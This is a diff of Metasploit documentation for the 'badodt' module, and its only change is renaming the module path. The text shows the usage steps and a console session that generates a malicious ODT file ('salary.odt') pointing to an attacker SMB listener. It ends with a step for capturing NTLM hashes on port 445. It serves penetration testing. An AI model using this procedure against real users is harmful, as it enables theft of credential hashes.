@@ -11,7 +11,7 @@ without providing any warning to the user. This allows an attacker the opportuni
 
   1. Install the application
   2. Start msfconsole
-  3. Do: ```use auxiliary/odt/badodt```
+  3. Do: ```use auxiliary/fileformat/odt_badodt```
   4. Customise Options as required
   5. Do: ```run```
   6. A malicious document will then be generated.
@@ -47,20 +47,20 @@ set LISTENER 192.168.1.25
 Install LibreOffice 6.03 or Apache OpenOffice 4.1.5 on a Windows workstation.  (Note: This attack does not work against Mac or Linux versions.)
 
   ```
-  msf5 > use auxiliary/odt/badodt
-  msf5 auxiliary(odt/badodt) > set FILENAME salary.odt
+  msf5 > use auxiliary/fileformat/odt_badodt 
+  msf5 auxiliary(fileformat/odt_badodt) > set FILENAME salary.odt
   FILENAME => salary.odt
-  msf5 auxiliary(odt/badodt) > set LHOST 192.168.1.25
+  msf5 auxiliary(fileformat/odt_badodt) > set LHOST 192.168.1.25
   LHOST => 192.168.1.25
-  msf5 auxiliary(odt/badodt) > set CREATOR A_USER
+  msf5 auxiliary(fileformat/odt_badodt) > set CREATOR A_USER
   CREATOR => A_USER
-  msf5 auxiliary(odt/badodt) > exploit
+  msf5 auxiliary(fileformat/odt_badodt) > exploit
 
   [*] Generating Malicious ODT File 
   [*] SMB Listener Address will be set to 192.168.1.25
   [+] salary.odt stored at /root/.msf4/local/salary.odt
   [*] Auxiliary module execution completed
-  msf auxiliary(odt/badodt) > 
+  msf auxiliary(fileformat/odt_badodt) > 
   ```
 
 On an attacker workstation, use a tool to serve and capture an SMB share on port 445, capturing NTLM hashes.  Note that any tool listening on :445 will require superuser permissions:
